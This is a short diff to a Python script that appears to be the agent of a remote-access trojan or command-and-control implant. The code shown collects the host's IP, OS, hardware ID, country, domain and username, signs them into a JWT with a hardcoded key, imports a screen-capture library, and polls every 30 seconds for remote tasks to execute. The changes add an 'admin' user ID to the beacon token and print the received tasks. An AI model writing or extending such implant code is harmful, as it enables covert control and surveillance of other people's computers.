@@ -1,3 +1,4 @@
+from plistlib import UID
 import requests
 import jwt
 import os
@@ -11,6 +12,9 @@ import mss
 import base64
 
 #INITIALIZE - wait, do whatever
+
+global uID
+uID = 'admin'
 
 def check_http_access() -> bool:
     """
@@ -90,7 +94,8 @@ def generateJWT() -> str:
     dUN = os.popen('whoami').read().split('\\')
     uName = dUN[1].split('\n')[0]
     dName = dUN[0]
-    token = {'ip': ip, 'os': oS, 'user': uName, 'hwid': hwid, 'time': timestamp, 'country': country, 'domain': dName}
+    global uID
+    token = {'uID': uID,'ip': ip, 'os': oS, 'user': uName, 'hwid': hwid, 'time': timestamp, 'country': country, 'domain': dName}
     token = jwt.encode(token, 'Noire')
     return token
 
@@ -143,6 +148,7 @@ if checkSetup():
             for task in tasks:
                 executor.submit(parseTask, task, token, uniquePath, responsePath)'''
         if tasks != ['']:
+            print(tasks)
             for task in tasks:
                 parseTask(task, token, uniquePath, responsePath)
         time.sleep(30)#make customiseable
